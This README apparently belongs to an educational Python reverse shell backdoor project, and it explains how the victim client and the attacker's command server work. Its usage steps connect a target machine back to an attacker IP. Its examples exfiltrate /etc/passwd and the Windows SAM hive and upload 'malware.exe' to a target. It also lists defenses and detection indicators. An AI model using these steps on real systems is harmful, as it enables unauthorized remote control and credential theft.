# Reverse Shell Backdoor Project

## Overview

This project demonstrates a reverse shell backdoor implementation using Python. The reverse shell allows remote control of a compromised system by establishing a connection from the victim's machine (client) to an attacker's system (server). This project helps students understand socket programming, command execution, file transfer, and cybersecurity defense mechanisms.

**⚠️ WARNING: This project is for EDUCATIONAL PURPOSES ONLY. Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit permission to test.**

## Project Structure

```
Backdoor-Reverse-Shell-/
├── client.py      # Runs on the target machine
├── server.py      # Runs on the attacker's machine
└── README.md      # This file
```

## Components

### 1. `client.py` - Reverse Shell Client
- Runs on the target/victim machine
- Initiates connection to the attacker's server
- Executes commands received from the server
- Supports file upload/download operations
- Automatically reconnects if connection is lost

### 2. `server.py` - Command & Control Server
- Runs on the attacker's machine
- Listens for incoming client connections
- Provides an interactive shell interface
- Allows remote command execution
- Supports file transfer operations

## Features

### Core Functionality
- **Socket Programming**: TCP/IP connections using Python's socket library
- **Command Execution**: Remote execution of system commands
- **File Transfer**: Upload and download files using Base64 encoding
- **Directory Navigation**: Support for `cd` command to change directories
- **Persistent Connection**: Automatic reconnection on connection loss
- **JSON Communication**: Structured data exchange between client and server

### Security Features
- Base64 encoding for file transfer
- JSON-based protocol for structured communication
- Error handling and connection resilience

## Installation

### Requirements
- Python 3.6 or higher
- No external dependencies (uses only standard library)

### Setup
1. Clone or download this repository
2. Ensure Python 3 is installed on both machines
3. No additional packages required

## Usage

### Step 1: Start the Server (Attacker's Machine)

On the attacker's machine, start the server:

```bash
python server.py <bind_ip> <port>
```

**Examples:**
```bash
# Listen on all interfaces
python server.py 0.0.0.0 4444

# Listen only on localhost (for testing)
python server.py 127.0.0.1 4444
```

The server will display:
```
[+] Server listening on 0.0.0.0:4444
[*] Waiting for client connection...
```

### Step 2: Start the Client (Target Machine)

On the target machine, start the client:

```bash
python client.py <server_ip> <server_port>
```

**Example:**
```bash
python client.py 192.168.1.100 4444
```

The client will attempt to connect and display:
```
[+] Connected to 192.168.1.100:4444
```

### Step 3: Interact with the Shell

Once connected, you'll see a `shell>` prompt on the server. You can now execute commands.

## Available Commands

### System Commands
Execute any system command that the target OS supports:

```bash
shell> dir          # List directory (Windows)
shell> ls           # List directory (Linux/Mac)
shell> pwd          # Print working directory
shell> whoami       # Show current user
shell> cd /path     # Change directory
shell> cat file.txt # Display file contents
```

### File Download
Download a file from the target machine:

```bash
shell> download <remote_path> [local_path]
```

**Examples:**
```bash
shell> download /etc/passwd
shell> download C:\Windows\System32\config\sam backup_sam
shell> download /home/user/document.txt ./downloaded_doc.txt
```

### File Upload
Upload a file to the target machine:

```bash
shell> upload <local_path> <remote_path>
```

**Examples:**
```bash
shell> upload script.py /tmp/script.py
shell> upload malware.exe C:\Users\Public\malware.exe
```

### Help
Display the help menu:

```bash
shell> help
```

### Exit
Close the connection:

```bash
shell> exit
```

## How It Works

### 1. Connection Establishment
- The client (`client.py`) continuously attempts to connect to the server
- The server (`server.py`) listens on a specified port and accepts connections
- Once connected, a bidirectional communication channel is established

### 2. Command Execution Flow
1. User enters a command in the server's shell interface
2. Server sends the command as JSON to the client
3. Client executes the command using `subprocess`
4. Client captures stdout/stderr and sends output back to server
5. Server displays the output to the user

### 3. File Transfer Mechanism
- **Download**: Client reads file, Base64 encodes it, sends to server
- **Upload**: Server reads local file, Base64 encodes it, sends to client
- Client decodes and saves the file to the specified path

### 4. Directory Navigation
- The `cd` command is handled specially to maintain current working directory
- Client tracks the current directory for relative path operations

### 5. Reconnection Logic
- If connection is lost, client automatically attempts to reconnect
- Server can accept new connections after a client disconnects

## Technical Details

### Communication Protocol
- **Format**: JSON
- **Encoding**: UTF-8
- **Transport**: TCP/IP sockets

### Message Types

**Command Execution:**
```json
{
  "type": "command",
  "command": "ls -la"
}
```

**Response:**
```json
{
  "type": "response",
  "output": "file1.txt\nfile2.txt\n..."
}
```

**File Download Request:**
```json
{
  "type": "download",
  "file_path": "/path/to/file"
}
```

**File Upload:**
```json
{
  "type": "upload",
  "file_path": "/remote/path",
  "content": "base64_encoded_content"
}
```

## Key Concepts Covered

- **Socket Programming**: Establishing and managing network connections
- **JSON Data Exchange**: Sending and receiving structured data
- **Command Execution**: Running system commands on a remote machine
- **Base64 Encoding/Decoding**: Secure file transfer over the network
- **Multi-threading & Persistent Connections**: Ensuring continuous control
- **Cybersecurity & Ethical Hacking**: Understanding real-world exploitation techniques and countermeasures

## Security Considerations

### Defense Mechanisms
To protect against reverse shell attacks:

1. **Firewall Configuration**: Block unauthorized outbound connections
2. **Network Monitoring**: Detect unusual outbound connections
3. **Process Monitoring**: Monitor for suspicious processes
4. **File Integrity**: Use tools like Tripwire to detect file modifications
5. **Intrusion Detection Systems (IDS)**: Deploy network and host-based IDS
6. **Least Privilege**: Run services with minimal required permissions
7. **Regular Updates**: Keep systems patched and updated

### Detection Indicators
- Unusual outbound network connections
- Processes making network connections
- Base64 encoded data in network traffic
- Suspicious command execution patterns

## Ethical Use

**IMPORTANT**: This project is intended for:
- Educational purposes
- Security research
- Authorized penetration testing
- Learning about cybersecurity defense

**DO NOT USE** for:
- Unauthorized access to systems
- Malicious activities
- Any illegal purposes

Always obtain proper authorization before testing on any system.

## Troubleshooting

### Connection Issues
- **Firewall blocking**: Ensure firewall allows connections on the specified port
- **Wrong IP address**: Verify the server IP address is correct
- **Port already in use**: Choose a different port number

### File Transfer Issues
- **Permission denied**: Ensure proper file permissions on target system
- **Path not found**: Verify file paths are correct
- **Large files**: Very large files may take time to transfer

### Command Execution Issues
- **Command not found**: Some commands may not be available on all systems
- **Permission errors**: Some commands require elevated privileges

## Testing

### Local Testing
1. Open two terminal windows
2. Run `server.py` in one terminal: `python server.py 127.0.0.1 4444`
3. Run `client.py` in another: `python client.py 127.0.0.1 4444`
4. Test commands and file transfers

### Network Testing
1. Ensure both machines are on the same network
2. Find the server's IP address: `ipconfig` (Windows) or `ifconfig` (Linux/Mac)
3. Start server on attacker machine
4. Start client on target machine with server's IP

## Limitations

- No encryption (traffic is unencrypted)
- No authentication mechanism
- Single client connection at a time
- Basic error handling
- No command history or tab completion

## Future Enhancements

Potential improvements:
- Add encryption (TLS/SSL)
- Implement authentication
- Support multiple concurrent clients
- Add command history
- Implement file compression
- Add logging capabilities
- Create GUI interface
- Add persistence mechanisms

## License

This project is provided for educational purposes only. Use responsibly and ethically.

## Author

Created for educational purposes to demonstrate reverse shell concepts and cybersecurity principles.

## References

- Python Socket Programming: https://docs.python.org/3/library/socket.html
- Subprocess Module: https://docs.python.org/3/library/subprocess.html
- Base64 Encoding: https://docs.python.org/3/library/base64.html
